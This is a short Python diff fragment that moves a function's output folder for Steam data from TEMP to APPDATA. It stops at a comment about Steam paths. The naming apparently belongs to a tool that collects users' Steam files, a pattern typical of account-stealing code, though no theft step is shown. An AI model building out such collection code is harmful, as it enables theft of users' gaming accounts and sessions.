@@ -3,7 +3,7 @@ import shutil
 
 def steam_st():
     # Output folder
-    output_dir = os.path.join(os.environ['TEMP'], "output", "Applications", "Steam")
+    output_dir = os.path.join(os.environ['APPDATA'], "output", "Applications", "Steam")
     os.makedirs(output_dir, exist_ok=True)
 
     # Steam paths
